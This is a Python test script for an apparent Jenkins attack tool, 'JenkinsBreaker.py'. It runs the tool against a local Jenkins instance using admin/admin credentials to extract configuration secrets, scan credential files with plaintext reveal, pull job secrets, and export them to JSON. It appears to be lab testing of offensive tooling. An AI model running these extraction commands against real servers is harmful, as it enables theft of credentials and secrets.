#!/usr/bin/env python3
"""Comprehensive test of all secrets extraction features."""

import subprocess
import json
import os

def run_test(name, cmd):
    print(f"\n{'='*80}")
    print(f"TEST: {name}")
    print(f"{'='*80}")
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    # Extract relevant lines (skip dependency checks)
    lines = result.stdout.split('\n')
    relevant = []
    skip = True
    for line in lines:
        if '[+] Loaded exploit:' in line:
            skip = False
        if not skip and line.strip():
            relevant.append(line)
    
    for line in relevant[-20:]:  # Show last 20 relevant lines
        print(line)
    
    return result.returncode == 0

jenkins_url = "http://localhost:8080"
username = "admin"
password = "admin"

tests = [
    ("Extract config secrets (redacted)", 
     f'python JenkinsBreaker.py --url {jenkins_url} --username {username} --password {password} --extract-secrets'),
    
    ("Scan credential files (revealed)", 
     f'python JenkinsBreaker.py --url {jenkins_url} --username {username} --password {password} --scan-credential-files --reveal-secrets'),
    
    ("Extract job secrets", 
     f'python JenkinsBreaker.py --url {jenkins_url} --username {username} --password {password} --extract-job-secrets'),
    
    ("Export to JSON (redacted)", 
     f'python JenkinsBreaker.py --url {jenkins_url} --username {username} --password {password} --scan-credential-files --export-secrets test_final.json'),
    
    ("Combined extraction", 
     f'python JenkinsBreaker.py --url {jenkins_url} --username {username} --password {password} --extract-secrets --scan-credential-files --reveal-secrets'),
]

os.chdir(os.path.dirname(os.path.abspath(__file__)))

passed = 0
failed = 0

for name, cmd in tests:
    if run_test(name, cmd):
        passed += 1
        print(f"\n[PASS] {name}")
    else:
        failed += 1
        print(f"\n[FAIL] {name}")

# Verify JSON export
if os.path.exists('test_final.json'):
    print(f"\n{'='*80}")
    print("JSON EXPORT VERIFICATION")
    print(f"{'='*80}")
    with open('test_final.json', 'r') as f:
        data = json.load(f)
    print(f"Target: {data['target']}")
    print(f"Secrets count: {data['secrets_count']}")
    if data['secrets_count'] > 0:
        print(f"First secret: {data['secrets'][0]['type']} from {data['secrets'][0]['source']}")
        print(f"Has plaintext: {'value' in data['secrets'][0]}")

print(f"\n{'='*80}")
print(f"FINAL SUMMARY: {passed}/{len(tests)} tests passed")
print(f"{'='*80}")
